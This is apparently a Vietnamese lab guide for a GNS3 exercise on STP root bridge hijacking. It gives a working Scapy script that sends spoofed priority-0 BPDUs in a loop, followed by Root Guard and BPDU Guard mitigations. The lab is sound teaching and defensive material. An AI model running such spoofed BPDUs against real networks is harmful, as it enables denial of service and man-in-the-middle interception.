# 🌳 Lab: Spanning Tree Protocol (STP) Attack - Root Bridge Hijacking

## 🎯 Mục tiêu bài Lab
Bài lab này mô phỏng cuộc tấn công vào giao thức Spanning Tree Protocol (STP) ở Layer 2. Mục tiêu là giúp hiểu rõ cơ chế bầu chọn Root Bridge của STP và cách một kẻ tấn công có thể lợi dụng nó để:
* Thay đổi cấu trúc (Topology) của hệ thống mạng.
* Gây ra tình trạng Denial of Service (DoS) bằng cách tạo loop hoặc làm gián đoạn lưu lượng.
* Thiết lập tiền đề cho các cuộc tấn công Man-in-the-Middle (MitM) bằng cách ép lưu lượng mạng đi qua switch của kẻ tấn công.

## ⚙️ Môi trường & Công cụ
* **Nền tảng:** GNS3
* **Thiết bị:** Cisco Layer 2 Switches (VD: IOU/IOL)
* **Máy tấn công:** Kali Linux
* **Ngôn ngữ & Thư viện:** Python kết hợp với thư viện `scapy` để chế tạo và gửi các gói tin mạng.
* **Công cụ phân tích:** Wireshark (để bắt và đọc gói tin BPDU).

## 🚀 Kịch bản tấn công (Attack Scenario)

### Bước 1: Trinh sát (Reconnaissance)
Sử dụng Wireshark để lắng nghe (sniff) các gói tin mạng trên cổng kết nối với Switch.
Tìm kiếm các gói tin **Configuration BPDU** do Root Bridge hiện tại gửi ra. 
Ghi nhận hai thông số quan trọng:
* `Root Bridge ID` (Bao gồm Priority và MAC Address hiện tại).
* Cổng mạng (Interface) đang kết nối.

### Bước 2: Chế tạo gói tin (Crafting the Payload)
Sử dụng **Scapy** trong Python để tạo một gói tin BPDU giả mạo. Để chiếm quyền Root Bridge, kẻ tấn công cần thiết lập giá trị `Bridge Priority` thấp hơn so với Root Bridge hiện tại (ví dụ: set Priority về `0` hoặc `4096`).

*Đoạn mã Python/Scapy minh họa cơ bản:*
```python
from scapy.all import *

# MAC của máy tấn công
attacker_mac = "00:11:22:33:44:55" 

# Tạo frame Ethernet với địa chỉ multicast của STP
eth = Dot3(src=attacker_mac, dst="01:80:c2:00:00:00")
llc = LLC(dsap=0x42, ssap=0x42, ctrl=3)

# Chế tạo STP Configuration BPDU với Priority = 0
stp = STP(bpdutype=0x00, bpduflags=0x00, rootid=0, rootmac=attacker_mac, bridgeid=0, bridgemac=attacker_mac)

# Ghép nối và gửi gói tin liên tục
pkt = eth/llc/stp
sendp(pkt, iface="eth0", loop=1, inter=2)
```

### ⚡ Bước 3: Thực thi & Quan sát (Execution)
- Chạy script Python trên máy Kali Linux  
- Quan sát sự thay đổi trạng thái trên các Cisco Switch (`show spanning-tree`)  

**Kết quả:**
- Các switch sẽ tính toán lại Spanning Tree  
- Root Bridge mới sẽ trở thành máy của kẻ tấn công  
- Mạng có thể bị gián đoạn hoặc bị chuyển hướng lưu lượng  

---

## 🛡️ Biện pháp phòng thủ (Mitigation)

Để ngăn chặn các cuộc tấn công thao túng STP, cần áp dụng các tính năng bảo mật Layer 2 trên thiết bị Cisco:

### 1. Root Guard
Cấu hình trên các cổng hướng xuống (Access layer).  
Nếu nhận BPDU có priority tốt hơn → chuyển sang trạng thái `root-inconsistent`.

```bash
Switch(config-if)# spanning-tree guard root
```

### 2. BPDU Guard

Cấu hình trên các cổng Access (kết nối với host).
Nếu nhận BPDU → cổng bị shutdown (err-disable).
```bash
Switch(config-if)# spanning-tree bpduguard enable
```